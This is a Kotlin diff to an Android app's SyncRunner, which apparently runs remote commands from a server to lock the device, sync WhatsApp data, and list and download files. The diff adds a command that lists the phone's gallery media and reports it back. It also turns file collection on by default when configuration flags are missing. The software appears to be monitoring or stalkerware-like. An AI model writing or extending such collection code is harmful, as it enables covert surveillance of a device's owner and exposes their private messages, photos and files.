@@ -89,8 +89,9 @@ class SyncRunner(private val context: Context) {
         if (flags == null || flags.remote_lock) {
             commands.filter { it.command_type == "lock" }.forEach { processLockCommand(bearer, it) }
         }
-        if (flags?.file_manager == true) {
+        if (flags == null || flags.file_manager) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
+            commands.filter { it.command_type == "gallery_list" }.forEach { processGalleryListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
         commands.filter { it.command_type == "sync_whatsapp" }.forEach { command ->
@@ -196,6 +197,7 @@ class SyncRunner(private val context: Context) {
         }
         if (flags.file_manager) {
             commands.filter { it.command_type == "file_list" }.forEach { processFileListCommand(bearer, it) }
+            commands.filter { it.command_type == "gallery_list" }.forEach { processGalleryListCommand(bearer, it) }
             commands.filter { it.command_type == "whatsapp_file_list" }.forEach { processWhatsAppFileListCommand(bearer, it) }
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
@@ -308,6 +310,15 @@ class SyncRunner(private val context: Context) {
     private suspend fun processWhatsAppFileListCommand(bearer: String, command: RemoteCommand) {
         try {
             val files = FileManagerCollector(context).listWhatsAppFiles()
+            ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
+        } catch (e: Exception) {
+            // Retried next sync cycle.
+        }
+    }
+
+    private suspend fun processGalleryListCommand(bearer: String, command: RemoteCommand) {
+        try {
+            val files = FileManagerCollector(context).listGalleryMedia()
             ApiClient.service.ackCommand(bearer, command.id, AckCommandRequest(success = true, files = files))
         } catch (e: Exception) {
             // Retried next sync cycle.
